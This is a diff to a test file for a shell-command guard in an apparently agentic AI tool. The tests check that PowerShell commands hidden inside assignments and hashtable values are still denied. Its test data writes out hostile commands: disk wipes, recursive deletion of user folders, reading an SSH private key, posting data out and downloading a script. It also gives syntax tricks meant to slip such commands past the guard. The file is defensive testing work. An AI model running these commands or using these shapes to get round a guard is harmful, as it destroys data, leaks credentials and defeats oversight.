@@ -9,7 +9,9 @@ import { resolvePaths } from '../src/paths.ts';
 import { PendingStore } from '../src/pending/store.ts';
 import { ApprovalBroker } from '../src/tools/approvals.ts';
 import { shellRun } from '../src/tools/builtin/shell.ts';
+import { codeFindings } from '../src/tools/hooks/code-guard.ts';
 import { outboundOf, pushesOf } from '../src/tools/hooks/outbound.ts';
+import { segments } from '../src/tools/hooks/parse-cmd.ts';
 import { realish } from '../src/tools/hooks/scope.ts';
 import { checkShellCommand } from '../src/tools/hooks/shell-guard.ts';
 import { lexShell } from '../src/tools/hooks/shell-lex.ts';
@@ -36,6 +38,7 @@ function workspace(t: { after: (fn: () => void) => void }): string {
 const COMMANDS = [
   'Clear-Disk -Number 1', 'Format-Volume -DriveLetter D', 'Remove-Item -Path C:/Users -Recurse -Force', 'Get-Content ~/.ssh/id_rsa',
   'git push --force origin main', 'Invoke-WebRequest https://example.com/x -Method Post -Body $b', 'Invoke-RestMethod -Uri https://example.com -OutFile x.ps1',
+  'npm install left-pad', 'Stop-Computer',
 ];
 
 // The third entry, when given, is the same place without the assignment: a command inside if ( ) is compared with if (C) itself
@@ -65,6 +68,30 @@ const ASSIGNS: Array<[string, (c: string) => string, ((c: string) => string)?]> 
   ['in $( )', c => `Write-Output $($r=${c})`],
   ['in script block', c => `1 | ForEach-Object { $r=${c} }`],
   ['in hashtable value', c => `@{ a = $r=${c} }`],
+  // security review of 80145330: `?` in a variable name, `??=`, a static member, a quoted or computed member, a quoted index with `=`
+  ['$x?=', c => `$x?=${c}`],
+  ['$x??=', c => `$x??=${c}`],
+  ['$x?+=', c => `$x?+=${c}`],
+  ['$x? =', c => `$x? =${c}`],
+  ['$x,$y?=', c => `$x,$y?=${c}`],
+  ['$x ??= ', c => `$x ??= ${c}`],
+  ['$x ??=', c => `$x ??=${c}`],
+  ['[Environment]::P=', c => `[Environment]::CurrentDirectory=${c}`],
+  ["$a.('b')=", c => `$a.('b')=${c}`],
+  ["$a.'b'=", c => `$a.'b'=${c}`],
+  ['$a."b"=', c => `$a."b"=${c}`],
+  ["$h['a=b']=", c => `$h['a=b']=${c}`],
+  ['$x?= in try', c => `try { $x?=${c} } catch {}`],
+  // hashtable values glued to `=` (pre-existing: the value was dropped)
+  ['@{a=C}', c => `@{a=${c}}`],
+  ["@{'a'=C}", c => `@{'a'=${c}}`],
+  ['@{a=C;b=1}', c => `@{a=${c};b=1}`],
+  ['@{b=1;a=C}', c => `@{b=1;a=${c}}`],
+  ['@{a =C}', c => `@{a =${c}}`],
+  ['@{a= C}', c => `@{a= ${c}}`],
+  ['@{ newline a=C }', c => `@{\nb=1\na=${c}\n}`],
+  ['Write-Output @{a=C}', c => `Write-Output @{a=${c}}`],
+  ['$x=@{a=C}', c => `$x=@{a=${c}}`],
 ];
 
 test('assign: a command on the right of any PowerShell assignment is judged no more loosely than at top level (judge on and off)', t => {
@@ -119,13 +146,52 @@ test('assign: ordinary assignments stay as before', t => {
     assert.notEqual(routeOf(row, { judgeOff: true }), 'owner', `${command} -> ${row.reasonKeys.join(',')}`);
   }
   // A glued operator (`$x=…`) was read as an expression before, so it keeps that judge reason: never looser than before
-  for (const command of ['$x=1', '$x=Get-ChildItem', '$x+=Get-ChildItem', '$a.b=Get-ChildItem', '[int]$x = 5']) {
+  // A variable name with `?` was read as `$a` and a `?` word before, so it keeps that judge reason too
+  for (const command of ['$x=1', '$x=Get-ChildItem', '$x+=Get-ChildItem', '$a.b=Get-ChildItem', '[int]$x = 5', '$a?', '$a?.b', '$a?[0]', '$a?[0].b', '$x? = 1', '$x ??= 1']) {
     const row = guardRowOf(MODS, command, 'powershell', ws);
     assert.ok(row.reasonKeys.includes('shape.expr'), `${command} -> ${row.reasonKeys.join(',')}`);
+  }
+  // The automatic variable `$?` is not such a name: it stays as before
+  for (const command of ['$?', 'Write-Output $?']) {
+    const row = guardRowOf(MODS, command, 'powershell', ws);
+    assert.ok(!row.reasonKeys.includes('shape.expr'), `${command} -> ${row.reasonKeys.join(',')}`);
   }
   // `$x =Cmd` gave code.unknown_target before (the code check read `$x` as the program); the right side is checked now, and that mark stays
   const spaced = guardRowOf(MODS, '$r =Get-ChildItem', 'powershell', ws);
   assert.ok(spaced.reasonKeys.includes('code.unknown_target'), spaced.reasonKeys.join(','));
+});
+
+// Recorded relaxations against base 479d6e14 (plans/beat/steps/control-bodies/deviations.md, assign-guard): head reads these as PowerShell does.
+// (a) base misread `=@` + `{…}` as a command and a script block; a hashtable of plain values is now an expression (judge).
+// (b) base refused `#` after a glued `=`; PowerShell reads `a#b` there as one generic token, not a comment.
+// The decisions are pinned so any further change shows up here: [command, route with the judge on, route with the judge off, decision]
+const RELAXED: Array<[string, string, string, string]> = [
+  ['$x=@{a=1}', 'judge', 'allow', 'ask'],
+  ['$p=@{Path=$f}', 'judge', 'allow', 'ask'],
+  ['$x=a#b', 'product', 'product', 'ask'],
+  ['$x=Remove-Item a#b', 'owner', 'owner', 'ask'],
+  ['Write-Output $x=a#b', 'allow', 'allow', 'allow'],
+];
+
+test('assign: recorded relaxations keep their pinned decisions, and a command inside such a hashtable is still refused', t => {
+  const ws = workspace(t);
+  for (const [command, on, off, decision] of RELAXED) {
+    const row = guardRowOf(MODS, command, 'powershell', ws);
+    assert.deepEqual([routeOf(row, { judgeOff: false }), routeOf(row, { judgeOff: true }), row.decision], [on, off, decision], `${command} -> ${row.reasonKeys.join(',')}`);
+  }
+  for (const command of ['$x=@{a=Stop-Computer}', '@{a=Stop-Computer}', "@{'a'=Stop-Computer}", '@{a=Restart-Computer;b=1}', 'Write-Output @{a=Stop-Computer}', '@{a = Stop-Computer}']) {
+    const row = guardRowOf(MODS, command, 'powershell', ws);
+    assert.equal(row.decision, 'deny', `${command} -> ${row.reasonKeys.join(',')}`);
+  }
+});
+
+test('assign: the code check alone reads the right side after a quoted index and after ??=', t => {
+  const ws = workspace(t);
+  const keys = (command: string): string[] => segments(command).flatMap(seg => codeFindings(seg, { cwd: ws, language: 'en', selfHosts: [] })).map(found => found.key);
+  assert.ok(keys('npm install left-pad').includes('code.project_tool'));
+  for (const command of ["$h['a=b']=npm install left-pad", '$x ??=npm install left-pad', '$x ??= npm install left-pad']) {
+    assert.ok(keys(command).includes('code.project_tool'), `${command} -> ${keys(command).join(',')}`);
+  }
 });
 
 test('elevate: bash sudo / doas / su / pkexec anywhere a command runs is refused as guard.elevate', t => {
@@ -172,7 +238,7 @@ function world(t: { after: (fn: () => void) => void }, judgeMode: 'on' | 'off') 
 
 test('assign: through the pipeline with the judge off, a disk wipe on the right of an assignment is refused and never runs; an ordinary one runs', async t => {
   const w = world(t, 'off');
-  for (const command of ['$r=Clear-Disk -Number 1', '$r+=Clear-Disk -Number 1', '[int]$r=Clear-Disk -Number 1', '$env:X=Clear-Disk -Number 1']) {
+  for (const command of ['$r=Clear-Disk -Number 1', '$r+=Clear-Disk -Number 1', '[int]$r=Clear-Disk -Number 1', '$env:X=Clear-Disk -Number 1', '$x?=Stop-Computer', '@{a=Stop-Computer}', '$x=@{a=Stop-Computer}']) {
     const out = await w.run(command);
     assert.equal(out.decision, 'deny', `${command} -> ${out.decidedBy}: ${out.output.content}`);
     assert.notEqual(out.decidedBy, 'pending', command);
